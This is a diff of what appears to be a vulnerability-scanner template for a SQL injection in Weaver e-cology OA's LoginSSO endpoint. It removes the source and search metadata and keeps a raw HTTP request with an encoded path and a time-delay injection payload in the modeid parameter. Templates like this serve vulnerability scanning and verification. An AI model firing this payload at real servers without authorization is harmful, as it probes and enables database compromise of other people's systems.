@@ -3,12 +3,8 @@ info:
   name: 泛微-ecology loginsso sql注入
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zg8di41oo2v8w9qu'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: zg8di41oo2v8w9qu
-    fofa: app="泛微-OA（e-cology）"
 http:
 - raw:
   - GET /weaver/weaver.formmode.servelt.QRcodeBuildAction/login/LoginSSO.%25%36%61%25%37%33%25%37%30?modeid=1452+waitfor+delay+'0%3a0%3a6' HTTP/1.1
